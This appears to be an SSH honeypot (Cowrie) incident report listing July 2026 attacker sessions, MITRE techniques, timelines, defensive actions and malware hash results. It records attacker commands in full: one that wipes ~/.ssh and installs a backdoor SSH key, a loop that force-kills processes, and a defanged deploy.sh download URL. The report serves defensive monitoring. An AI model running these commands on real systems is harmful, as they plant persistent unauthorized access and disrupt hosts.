| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:45:00` | `cowrie.session.connect` |
| `2026-07-29 22:45:00` | `cowrie.client.version` |
| `2026-07-29 22:45:00` | `cowrie.client.kex` |
| `2026-07-29 22:45:01` | `cowrie.login.success` |
| `2026-07-29 22:45:02` | `cowrie.session.params` |
| `2026-07-29 22:45:02` | `cowrie.command.input` |
| `2026-07-29 22:45:02` | `cowrie.command.failed` |
| `2026-07-29 22:45:03` | `cowrie.log.closed` |
| `2026-07-29 22:45:03` | `cowrie.session.params` |
| `2026-07-29 22:45:03` | `cowrie.command.input` |
| `2026-07-29 22:45:04` | `cowrie.session.file_download` |
| `2026-07-29 22:45:04` | `cowrie.log.closed` |
| `2026-07-29 22:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.148[.]74` to AbuseIPDB if not already reported
- [ ] Block `181.188.148[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7894e01e885

| Field | Detail |
|---|---|
| **Source IP** | `181.188.148[.]74` |
| **First Seen** | 2026-07-29 22:45 |
| **Last Seen** | 2026-07-29 22:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:45:04` | `cowrie.session.connect` |
| `2026-07-29 22:45:04` | `cowrie.client.version` |
| `2026-07-29 22:45:04` | `cowrie.client.kex` |
| `2026-07-29 22:45:05` | `cowrie.login.success` |
| `2026-07-29 22:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.148[.]74` to AbuseIPDB if not already reported
- [ ] Block `181.188.148[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea1c872da86

| Field | Detail |
|---|---|
| **Source IP** | `181.188.148[.]74` |
| **First Seen** | 2026-07-29 22:45 |
| **Last Seen** | 2026-07-29 22:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:45:05` | `cowrie.session.connect` |
| `2026-07-29 22:45:05` | `cowrie.client.version` |
| `2026-07-29 22:45:05` | `cowrie.client.kex` |
| `2026-07-29 22:45:06` | `cowrie.login.success` |
| `2026-07-29 22:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.148[.]74` to AbuseIPDB if not already reported
- [ ] Block `181.188.148[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8d71e6f1b1

| Field | Detail |
|---|---|
| **Source IP** | `106.114.105[.]179` |
| **First Seen** | 2026-07-29 22:45 |
| **Last Seen** | 2026-07-29 22:46 |
| **Session Duration** | 62s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:45:33` | `cowrie.session.connect` |
| `2026-07-29 22:45:33` | `cowrie.client.version` |
| `2026-07-29 22:45:33` | `cowrie.client.kex` |
| `2026-07-29 22:45:34` | `cowrie.login.failed` |
| `2026-07-29 22:45:35` | `cowrie.login.success` |
| `2026-07-29 22:45:36` | `cowrie.session.params` |
| `2026-07-29 22:45:36` | `cowrie.command.input` |
| `2026-07-29 22:45:36` | `cowrie.command.failed` |
| `2026-07-29 22:45:37` | `cowrie.log.closed` |
| `2026-07-29 22:45:38` | `cowrie.session.params` |
| `2026-07-29 22:45:38` | `cowrie.command.input` |
| `2026-07-29 22:45:38` | `cowrie.log.closed` |
| `2026-07-29 22:45:39` | `cowrie.session.params` |
| `2026-07-29 22:45:39` | `cowrie.command.input` |
| `2026-07-29 22:45:39` | `cowrie.log.closed` |
| `2026-07-29 22:45:40` | `cowrie.session.params` |
| `2026-07-29 22:45:40` | `cowrie.command.input` |
| `2026-07-29 22:45:41` | `cowrie.log.closed` |
| `2026-07-29 22:45:42` | `cowrie.session.params` |
| `2026-07-29 22:45:42` | `cowrie.command.input` |
| `2026-07-29 22:45:42` | `cowrie.log.closed` |
| `2026-07-29 22:45:43` | `cowrie.session.params` |
| `2026-07-29 22:45:43` | `cowrie.command.input` |
| `2026-07-29 22:45:43` | `cowrie.log.closed` |
| `2026-07-29 22:45:44` | `cowrie.session.params` |
| `2026-07-29 22:45:44` | `cowrie.command.input` |
| `2026-07-29 22:45:44` | `cowrie.log.closed` |
| `2026-07-29 22:45:46` | `cowrie.session.params` |
| `2026-07-29 22:45:46` | `cowrie.command.input` |
| `2026-07-29 22:45:46` | `cowrie.log.closed` |
| `2026-07-29 22:45:47` | `cowrie.session.params` |
| `2026-07-29 22:45:47` | `cowrie.command.input` |
| `2026-07-29 22:45:47` | `cowrie.log.closed` |
| `2026-07-29 22:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.114.105[.]179` to AbuseIPDB if not already reported
- [ ] Block `106.114.105[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b15c13051a

| Field | Detail |
|---|---|
| **Source IP** | `211.240.117[.]75` |
| **First Seen** | 2026-07-29 22:46 |
| **Last Seen** | 2026-07-29 22:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:46:30` | `cowrie.session.connect` |
| `2026-07-29 22:46:30` | `cowrie.client.version` |
| `2026-07-29 22:46:30` | `cowrie.client.kex` |
| `2026-07-29 22:46:31` | `cowrie.login.success` |
| `2026-07-29 22:46:32` | `cowrie.session.params` |
| `2026-07-29 22:46:32` | `cowrie.command.input` |
| `2026-07-29 22:46:32` | `cowrie.command.failed` |
| `2026-07-29 22:46:33` | `cowrie.log.closed` |
| `2026-07-29 22:46:33` | `cowrie.session.params` |
| `2026-07-29 22:46:33` | `cowrie.command.input` |
| `2026-07-29 22:46:34` | `cowrie.session.file_download` |
| `2026-07-29 22:46:34` | `cowrie.log.closed` |
| `2026-07-29 22:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.240.117[.]75` to AbuseIPDB if not already reported
- [ ] Block `211.240.117[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7e044c8184

| Field | Detail |
|---|---|
| **Source IP** | `211.240.117[.]75` |
| **First Seen** | 2026-07-29 22:46 |
| **Last Seen** | 2026-07-29 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:46:34` | `cowrie.session.connect` |
| `2026-07-29 22:46:34` | `cowrie.client.version` |
| `2026-07-29 22:46:34` | `cowrie.client.kex` |
| `2026-07-29 22:46:35` | `cowrie.login.success` |
| `2026-07-29 22:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.240.117[.]75` to AbuseIPDB if not already reported
- [ ] Block `211.240.117[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a06c9a9d422

| Field | Detail |
|---|---|
| **Source IP** | `211.240.117[.]75` |
| **First Seen** | 2026-07-29 22:46 |
| **Last Seen** | 2026-07-29 22:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:46:35` | `cowrie.session.connect` |
| `2026-07-29 22:46:35` | `cowrie.client.version` |
| `2026-07-29 22:46:35` | `cowrie.client.kex` |
| `2026-07-29 22:46:36` | `cowrie.login.success` |
| `2026-07-29 22:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.240.117[.]75` to AbuseIPDB if not already reported
- [ ] Block `211.240.117[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc695b0f4744

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-07-29 22:49 |
| **Last Seen** | 2026-07-29 22:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:49:05` | `cowrie.session.connect` |
| `2026-07-29 22:49:05` | `cowrie.client.version` |
| `2026-07-29 22:49:05` | `cowrie.client.kex` |
| `2026-07-29 22:49:06` | `cowrie.login.success` |
| `2026-07-29 22:49:07` | `cowrie.session.params` |
| `2026-07-29 22:49:07` | `cowrie.command.input` |
| `2026-07-29 22:49:07` | `cowrie.command.failed` |
| `2026-07-29 22:49:08` | `cowrie.log.closed` |
| `2026-07-29 22:49:09` | `cowrie.session.params` |
| `2026-07-29 22:49:09` | `cowrie.command.input` |
| `2026-07-29 22:49:09` | `cowrie.session.file_download` |
| `2026-07-29 22:49:09` | `cowrie.log.closed` |
| `2026-07-29 22:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c14cf639e65b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-07-29 22:49 |
| **Last Seen** | 2026-07-29 22:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:49:09` | `cowrie.session.connect` |
| `2026-07-29 22:49:09` | `cowrie.client.version` |
| `2026-07-29 22:49:09` | `cowrie.client.kex` |
| `2026-07-29 22:49:10` | `cowrie.login.success` |
| `2026-07-29 22:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71316afa8ce3

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-07-29 22:49 |
| **Last Seen** | 2026-07-29 22:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:49:11` | `cowrie.session.connect` |
| `2026-07-29 22:49:11` | `cowrie.client.version` |
| `2026-07-29 22:49:11` | `cowrie.client.kex` |
| `2026-07-29 22:49:12` | `cowrie.login.success` |
| `2026-07-29 22:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1394102094b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-29 22:50 |
| **Last Seen** | 2026-07-29 22:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_OK` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:50:58` | `cowrie.session.connect` |
| `2026-07-29 22:50:58` | `cowrie.login.success` |
| `2026-07-29 22:50:58` | `cowrie.session.params` |
| `2026-07-29 22:50:59` | `cowrie.command.input` |
| `2026-07-29 22:50:59` | `cowrie.log.closed` |
| `2026-07-29 22:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e6236424995

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-29 22:50 |
| **Last Seen** | 2026-07-29 22:51 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo WRITABLE >/tmp/.testfile 2>&1, ls -l /tmp/.testfile 2>&1, rm -f /tmp/.testfile, cd /tmp, for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num" 2>/dev/null; fi; fi; done;` |
| **Download Attempts** | hxxp://91.199.133[.]133:8080/deploy.sh, hxxp://91.199.133[.]133:8080/deploy.sh, b5147693ed4a8744cd3c32e2a2b8c6ec77acc6c8f0494b994398161a0ba009c5 |
| **Malware Analysis** | 0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7 (LOW) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1489 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 22:50:59` | `cowrie.session.connect` |
| `2026-07-29 22:51:01` | `cowrie.login.success` |
| `2026-07-29 22:51:02` | `cowrie.session.params` |
| `2026-07-29 22:51:02` | `cowrie.command.input` |
| `2026-07-29 22:51:03` | `cowrie.command.input` |
| `2026-07-29 22:51:03` | `cowrie.command.input` |
| `2026-07-29 22:51:04` | `cowrie.command.input` |
| `2026-07-29 22:51:04` | `cowrie.command.input` |
| `2026-07-29 22:51:04` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.failed` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.command.input` |
| `2026-07-29 22:51:05` | `cowrie.session.file_download` |
| `2026-07-29 22:51:05` | `cowrie.session.file_download.failed` |
| `2026-07-29 22:51:05` | `cowrie.session.file_download` |
| `2026-07-29 22:51:25` | `cowrie.command.input` |
| `2026-07-29 22:51:27` | `cowrie.command.input` |
| `2026-07-29 22:51:28` | `cowrie.command.input` |
| `2026-07-29 22:51:28` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.input` |
| `2026-07-29 22:51:29` | `cowrie.command.failed` |
| `2026-07-29 22:51:29` | `cowrie.command.failed` |
| `2026-07-29 22:51:29` | `cowrie.command.failed` |
| `2026-07-29 22:51:29` | `cowrie.command.failed` |
| `2026-07-29 22:51:54` | `cowrie.session.input` |
| `2026-07-29 22:51:56` | `cowrie.session.file_download` |
| `2026-07-29 22:51:56` | `cowrie.session.file_download` |
| `2026-07-29 22:51:56` | `cowrie.log.closed` |
| `2026-07-29 22:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **47** | 2026-07-29 20:55 | 2026-07-29 22:53 | 45m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-07-29 21:18 | 2026-07-29 22:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-07-29 21:39 | 2026-07-29 21:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-29 22:04 | 2026-07-29 22:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.181.10[.]189` | **2** | 2026-07-29 22:00 | 2026-07-29 22:02 | 4m | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | **2** | 2026-07-29 22:41 | 2026-07-29 22:43 | 2m | 0 | `T1592` | 🟢 LOW |
| `118.145.238[.]60` | 1 | 2026-07-29 22:02 | 2026-07-29 22:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-07-29 21:55 | 2026-07-29 21:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.52.92[.]136` | 1 | 2026-07-29 22:35 | 2026-07-29 22:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-07-29 22:27 | 2026-07-29 22:28 | 44s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-07-29 21:42 | 2026-07-29 21:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `223.107.72[.]234` | 1 | 2026-07-29 22:02 | 2026-07-29 22:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-29 22:03 | 2026-07-29 22:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]241` | 1 | 2026-07-29 22:00 | 2026-07-29 22:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-29 20:57 | 2026-07-29 20:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.163.93[.]64` | 1 | 2026-07-29 21:20 | 2026-07-29 21:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.115[.]5` | 1 | 2026-07-29 22:00 | 2026-07-29 22:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-29 21:07 | 2026-07-29 21:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]18` | 1 | 2026-07-29 22:50 | 2026-07-29 22:50 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
